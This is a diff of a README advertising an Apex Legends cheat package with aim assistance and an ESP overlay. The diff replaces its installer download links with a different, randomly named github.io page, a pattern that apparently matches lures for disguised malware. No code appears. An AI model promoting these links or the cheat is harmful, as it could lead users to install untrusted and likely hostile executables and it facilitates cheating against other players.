@@ -2,7 +2,7 @@
 
 The Apex Legends Utility Suite is a comprehensive toolset designed for the 2026 season, offering a range of features including advanced aim assistance and a customizable ESP overlay. This package provides players with a robust set of configurable utilities to enhance their gameplay experience in Apex Legends.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -38,4 +38,4 @@ A: The utility is designed to be lightweight. However, like any overlay applicat
 
 ## Download
 
-[Download the latest version from the official website](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from the official website](https://capitals-707-bringing.github.io/download-page/)
